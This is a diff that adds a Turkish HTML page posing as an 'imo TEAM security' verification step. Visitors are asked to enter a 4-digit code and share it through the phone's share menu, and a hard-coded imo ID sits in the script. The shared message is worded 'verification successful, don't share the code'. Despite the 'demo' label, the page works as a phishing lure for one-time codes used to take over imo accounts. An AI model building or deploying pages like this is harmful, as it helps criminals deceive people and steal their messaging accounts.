@@ -1,0 +1,168 @@
+!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demo Doğrulama</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f0f13;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: #1a1a22;
+            border-radius: 16px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            border: 1px solid #2a2a35;
+        }
+        .badge {
+            display: inline-block;
+            background: #6b5bff20;
+            color: #6b5bff;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 4px 12px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            letter-spacing: 0.5px;
+        }
+        h2 { color: #fff; font-size: 22px; margin-bottom: 8px; font-weight: 600; }
+        .desc { color: #8888a0; font-size: 13px; margin-bottom: 28px; line-height: 1.5; }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0f0f13;
+            border: 1px solid #2a2a35;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 18px;
+            letter-spacing: 3px;
+            text-align: center;
+            margin-bottom: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input:focus { border-color: #6b5bff; }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #6b5bff;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        button:hover { background: #5a4ae0; }
+        button:disabled { background: #444; cursor: not-allowed; }
+        .warning {
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #2a2a35;
+            color: #666;
+            font-size: 11px;
+            text-align: center;
+            line-height: 1.5;
+        }
+        .status {
+            margin-top: 12px;
+            font-size: 12px;
+            text-align: center;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="badge">Doğrulama kodu</div>
+        <h2>imo TEAM security seçin</h2>
+        <p class="desc">Kodu girin, ardından paylaşım menüsünden imo TEAM security'yu seçin.</p>
+
+        <input type="text" id="codeInput" placeholder="0000" maxlength="4" inputmode="numeric">
+        <button id="submitBtn" onclick="sendDemo()">
+            <span>Paylaş</span>
+        </button>
+
+        <div class="status" id="status"></div>
+
+        <div class="warning">
+            Gerçek SMS/e-posta doğrulaması yapılmaz.<br>
+            Paylaşım menüsünden <b>imo</b>'yu seçip gönderin.
+        </div>
+    </div>
+
+    <script>
+        // Sabit İMO ID
+        const IMO_ID = 'imoid_rqrUMnicaq';
+
+        // Paylaşılacak mesajı oluştur
+        function buildMessage(code) {
+            const time = new Date().toLocaleString('tr-TR');
+            return 'Doğrulama başarili ' + '\n' +
+                   'Kodu kimse ile paylaşmayin'  + '\n' +
+                   'Kod: ' + code + '\n' +
+                   'Zaman: ' + time;
+        }
+
+        // Paylaşım fonksiyonu
+        async function sendDemo() {
+            const code = document.getElementById('codeInput').value.trim();
+            const btn = document.getElementById('submitBtn');
+            const status = document.getElementById('status');
+
+            if (!code) {
+                alert('Lütfen bir kod girin.');
+                return;
+            }
+
+            if (code.length !== 4) {
+                alert('Kod 4 haneli olmalıdır.');
+                return;
+            }
+
+            const message = buildMessage(code);
+
+            // Web Share API destekleniyor mu kontrol et
+            if (navigator.share) {
+                try {
+                    await navigator.share({
+                        title: 'Demo Doğrulama',
+                        text: message
+                    });
+                    status.textContent = 'Paylaşım menüsü açıldı. imo\'yu seçin.';
+                } catch (err) {
+                    // Kullanıcı iptal ettiyse veya hata olduysa
+                    if (err.name !== 'AbortError') {
+                        status.textContent = 'Paylaşım açılamadı. Tekrar deneyin.';
+                    }
+                }
+            } else {
+                // Web Share API yoksa alternatif: WhatsApp'a yönlendir (imo yok)
+                status.textContent = 'Cihazınız paylaşım menüsünü desteklemiyor.';
+            }
+
+            document.getElementById('codeInput').value = '';
+        }
+
+        // Sadece rakam girişine izin ver
+        document.getElementById('codeInput').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+</body>
+</html>
